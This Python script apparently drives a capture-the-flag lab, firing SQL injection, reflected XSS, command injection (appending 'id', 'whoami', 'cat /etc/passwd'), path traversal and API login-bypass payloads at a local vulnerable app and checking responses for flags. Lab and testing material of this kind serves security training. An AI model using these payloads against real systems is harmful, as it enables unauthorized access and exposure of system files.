#!/usr/bin/env python3
"""
Comprehensive payload tester with app startup detection
Usage: python3 full_test.py
"""
import subprocess
import sys
import os
import time
import sqlite3
import requests
from urllib.parse import urljoin

# Configuration
APP_URL = "http://localhost:8080"
MAX_WAIT = 30  # seconds
TEST_TIMEOUT = 2  # seconds per HTTP request

def wait_for_app(max_wait=MAX_WAIT):
    """Wait for app to be ready"""
    print(f"Waiting up to {max_wait}s for app to start...")
    start = time.time()
    
    while time.time() - start < max_wait:
        try:
            response = requests.get(f"{APP_URL}/", timeout=1)
            if response.status_code == 200:
                print("✅ App is running!\n")
                return True
        except:
            pass
        
        # Also check database
        if os.path.exists('vulnerable.db'):
            print("✅ Database found, app should be starting...\n")
            time.sleep(2)
            return True
        
        elapsed = time.time() - start
        if elapsed % 5 < 0.1:  # Print every 5 seconds
            print(f"   ... {int(elapsed)}s elapsed")
        time.sleep(0.5)
    
    return False

def test_sqli_payloads():
    """Test SQL Injection payloads"""
    print("\n" + "="*70)
    print("CHALLENGE 1 & 5: SQL Injection Payloads")
    print("="*70)
    
    payloads = [
        ("' OR '1'='1' -- ", "", "Classic OR injection"),
        ("admin'--", "anything", "Admin bypass with comment"),
        ("' OR '1'='1", "' OR '1'='1", "OR on both fields"),
        ("admin' /*", "admin", "Comment block"),
    ]
    
    results = []
    for username, password, description in payloads:
        print(f"\n[{description}]")
        print(f"  Username: {username}")
        print(f"  Password: {password}")
        
        try:
            response = requests.post(
                f"{APP_URL}/login",
                data={'username': username, 'password': password},
                timeout=TEST_TIMEOUT,
                allow_redirects=False
            )
            
            # Check for flag in response
            if 'FLAG{' in response.text:
                print(f"  ✅ FLAG FOUND in response!")
                # Extract flag
                flag = response.text[response.text.find('FLAG{'):response.text.find('}')+1]
                print(f"  🚩 {flag}")
                results.append(('SQLi', description, True, flag))
            elif 'admin' in response.text.lower() or 'dashboard' in response.text.lower():
                print(f"  ✅ Payload successful (got logged in)")
                results.append(('SQLi', description, True, 'Logged in but flag not showing'))
            else:
                print(f"  ❌ Payload failed")
                results.append(('SQLi', description, False, 'No response'))
        except Exception as e:
            print(f"  ❌ Error: {str(e)}")
            results.append(('SQLi', description, False, str(e)))
    
    return results

def test_xss_payloads():
    """Test XSS payloads"""
    print("\n" + "="*70)
    print("CHALLENGE 2: XSS Payloads")
    print("="*70)
    
    payloads = [
        ("<script>alert('XSS')</script>", "Script injection"),
        ("<img src=x onerror=alert('XSS')>", "Image onerror"),
        ("'\"><script>alert('XSS')</script>", "Break out and inject"),
    ]
    
    results = []
    for payload, description in payloads:
        print(f"\n[{description}]")
        print(f"  Payload: {payload}")
        
        try:
            response = requests.get(
                f"{APP_URL}/search",
                params={'query': payload},
                timeout=TEST_TIMEOUT
            )
            
            # Check for flag
            if 'FLAG{' in response.text:
                print(f"  ✅ FLAG FOUND in response!")
                flag = response.text[response.text.find('FLAG{'):response.text.find('}')+1]
                print(f"  🚩 {flag}")
                results.append(('XSS', description, True, flag))
            elif payload in response.text:
                print(f"  ✅ Payload reflected in response")
                results.append(('XSS', description, True, 'Payload reflected'))
            else:
                print(f"  ❌ Payload not reflected")
                results.append(('XSS', description, False, 'Not reflected'))
        except Exception as e:
            print(f"  ❌ Error: {str(e)}")
            results.append(('XSS', description, False, str(e)))
    
    return results

def test_command_injection():
    """Test Command Injection payloads"""
    print("\n" + "="*70)
    print("CHALLENGE 3: Command Injection Payloads")
    print("="*70)
    
    payloads = [
        ("127.0.0.1; id", "Semicolon injection"),
        ("127.0.0.1 | whoami", "Pipe injection"),
        ("127.0.0.1 && cat /etc/passwd", "AND injection"),
        ("`whoami`", "Backtick injection"),
    ]
    
    results = []
    for payload, description in payloads:
        print(f"\n[{description}]")
        print(f"  Payload: {payload}")
        
        try:
            response = requests.post(
                f"{APP_URL}/ping",
                data={'host': payload},
                timeout=TEST_TIMEOUT
            )
            
            if 'FLAG{' in response.text:
                print(f"  ✅ FLAG FOUND in response!")
                flag = response.text[response.text.find('FLAG{'):response.text.find('}')+1]
                print(f"  🚩 {flag}")
                results.append(('Command Injection', description, True, flag))
            elif 'uid=' in response.text or 'root' in response.text:
                print(f"  ✅ Command executed!")
                results.append(('Command Injection', description, True, 'Command executed'))
            else:
                print(f"  ❌ Command not executed")
                results.append(('Command Injection', description, False, 'Not executed'))
        except Exception as e:
            print(f"  ❌ Error: {str(e)}")
            results.append(('Command Injection', description, False, str(e)))
    
    return results

def test_path_traversal():
    """Test Path Traversal payloads"""
    print("\n" + "="*70)
    print("CHALLENGE 4: Path Traversal Payloads")
    print("="*70)
    
    payloads = [
        ("../../../etc/passwd", "Simple traversal"),
        ("....//....//etc/passwd", "Double dot bypass"),
        ("/etc/passwd", "Absolute path"),
        ("files/../../../etc/passwd", "Mixed traversal"),
    ]
    
    results = []
    for payload, description in payloads:
        print(f"\n[{description}]")
        print(f"  Payload: {payload}")
        
        try:
            response = requests.get(
                f"{APP_URL}/files",
                params={'file': payload},
                timeout=TEST_TIMEOUT
            )
            
            if 'FLAG{' in response.text:
                print(f"  ✅ FLAG FOUND in response!")
                flag = response.text[response.text.find('FLAG{'):response.text.find('}')+1]
                print(f"  🚩 {flag}")
                results.append(('Path Traversal', description, True, flag))
            elif 'root:' in response.text:
                print(f"  ✅ Accessed /etc/passwd!")
                results.append(('Path Traversal', description, True, 'File accessed'))
            else:
                print(f"  ❌ Path traversal blocked")
                results.append(('Path Traversal', description, False, 'Blocked'))
        except Exception as e:
            print(f"  ❌ Error: {str(e)}")
            results.append(('Path Traversal', description, False, str(e)))
    
    return results

def test_api_auth_bypass():
    """Test API Authentication Bypass"""
    print("\n" + "="*70)
    print("CHALLENGE 5: API Authentication Bypass")
    print("="*70)
    
    payloads = [
        ({"username": "' OR '1'='1' -- ", "password": ""}, "SQLi in API"),
        ({"username": "admin", "password": "' OR '1'='1"}, "SQLi password"),
    ]
    
    results = []
    for payload, description in payloads:
        print(f"\n[{description}]")
        print(f"  Payload: {payload}")
        
        try:
            response = requests.post(
                f"{APP_URL}/api/login",
                json=payload,
                timeout=TEST_TIMEOUT
            )
            
            if response.status_code == 200:
                data = response.json()
                if 'flag' in data and data['flag']:
                    print(f"  ✅ FLAG FOUND in response!")
                    print(f"  🚩 {data['flag']}")
                    results.append(('API Auth Bypass', description, True, data['flag']))
                elif 'success' in data and data['success']:
                    print(f"  ✅ API authentication bypassed!")
                    results.append(('API Auth Bypass', description, True, 'Auth bypassed'))
                else:
                    print(f"  ⚠️  No flag in response: {data}")
                    results.append(('API Auth Bypass', description, False, 'No flag'))
            else:
                print(f"  ❌ API returned {response.status_code}")
                results.append(('API Auth Bypass', description, False, f'Status {response.status_code}'))
        except Exception as e:
            print(f"  ❌ Error: {str(e)}")
            results.append(('API Auth Bypass', description, False, str(e)))
    
    return results

def print_summary(all_results):
    """Print summary of test results"""
    print("\n" + "="*70)
    print("TEST SUMMARY")
    print("="*70)
    
    # Count results
    total = len(all_results)
    passed = sum(1 for r in all_results if r[2])
    
    print(f"\nTotal Tests: {total}")
    print(f"Passed: {passed}")
    print(f"Failed: {total - passed}")
    print(f"Success Rate: {(passed/total)*100:.1f}%\n")
    
    # List all results
    print("Detailed Results:")
    print("-" * 70)
    
    challenges = {}
    for challenge, description, passed, result in all_results:
        if challenge not in challenges:
            challenges[challenge] = []
        challenges[challenge].append((description, passed, result))
    
    for challenge in sorted(challenges.keys()):
        print(f"\n{challenge}:")
        for description, passed, result in challenges[challenge]:
            status = "✅" if passed else "❌"
            print(f"  {status} {description}")
            if result:
                print(f"     → {result}")

def main():
    print("="*70)
    print("COMPREHENSIVE PAYLOAD TESTER")
    print("="*70)
    print(f"Current directory: {os.getcwd()}\n")
    
    # Check if we can import requests
    try:
        import requests
    except ImportError:
        print("❌ 'requests' library not found")
        print("   Installing: pip install requests")
        subprocess.run([sys.executable, '-m', 'pip', 'install', 'requests'], check=False)
        print("   Please run this script again\n")
        sys.exit(1)
    
    # Wait for app to be ready
    if not wait_for_app():
        print("❌ App did not start within timeout")
        print("   Make sure vulnerable_app.py is running:")
        print("   python3 vulnerable_app.py")
        sys.exit(1)
    
    # Run tests
    all_results = []
    all_results.extend(test_sqli_payloads())
    all_results.extend(test_xss_payloads())
    all_results.extend(test_command_injection())
    all_results.extend(test_path_traversal())
    all_results.extend(test_api_auth_bypass())
    
    # Print summary
    print_summary(all_results)
    
    print("\n" + "="*70)
    print("Testing complete!")
    print("="*70)

if __name__ == '__main__':
    main()
